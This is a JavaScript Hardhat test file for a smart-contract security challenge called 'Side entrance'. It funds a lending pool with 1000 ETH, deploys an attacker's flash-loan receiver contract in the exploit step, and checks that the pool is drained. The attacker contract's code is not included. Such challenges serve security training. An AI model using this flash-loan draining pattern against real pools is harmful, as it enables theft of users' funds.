const { ethers } = require('hardhat');
const { expect } = require('chai');

const APPLY_FIXED_CONTRACT = true;

describe('[Challenge] Side entrance', function () {
  let deployer, attacker;

  const ETHER_IN_POOL = ethers.utils.parseEther('1000');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    let SideEntranceLenderPoolFactory;
    if (APPLY_FIXED_CONTRACT) {
      SideEntranceLenderPoolFactory = await ethers.getContractFactory(
        'SideEntranceLenderPoolFixed',
        deployer
      );
    } else {
      SideEntranceLenderPoolFactory = await ethers.getContractFactory(
        'SideEntranceLenderPool',
        deployer
      );
    }

    this.pool = await SideEntranceLenderPoolFactory.deploy();

    await this.pool.deposit({ value: ETHER_IN_POOL });

    this.attackerInitialEthBalance = await ethers.provider.getBalance(
      attacker.address
    );

    expect(await ethers.provider.getBalance(this.pool.address)).to.equal(
      ETHER_IN_POOL
    );
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const AttackFactory = await ethers.getContractFactory(
      'FlashLoanEtherReceiver',
      attacker
    );
    this.attackerContract = await AttackFactory.deploy(this.pool.address, {
      value: ETHER_IN_POOL,
    });
    this.attackerContract.connect(attacker).callFlashLoan();
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
      '0'
    );

    // Not checking exactly how much is the final balance of the attacker,
    // because it'll depend on how much gas the attacker spends in the attack
    // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
      this.attackerInitialEthBalance
    );
  });
});
